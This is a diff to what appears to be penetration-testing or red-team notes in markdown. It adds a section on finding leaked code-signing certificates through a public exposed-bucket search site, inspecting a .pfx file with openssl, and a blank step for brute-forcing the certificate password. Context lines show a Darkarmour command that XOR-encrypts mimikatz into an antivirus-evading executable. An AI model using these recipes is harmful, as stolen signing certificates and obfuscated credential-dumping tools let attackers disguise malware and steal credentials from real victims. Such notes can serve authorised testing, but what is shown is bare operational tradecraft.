@@ -1,3 +1,15 @@
+### Signed Certification
+```
+Looking for cert:
+https://grayhatwarfare.com/
+
+Extract cert information:
+openssl pkcs12 -info -in kligo-cert-win.pfx
+
+Brute-force cert password:
+
+```
+
 ### Darkarmour
 https://github.com/bats3c/darkarmour  
 python3 darkarmour.py -f /usr/share/windows-resources/mimikatz/x64/mimikatz.exe -e xor -j -k darkbyte -l 500 -u -o /home/kali/Desktop/b_m.exe
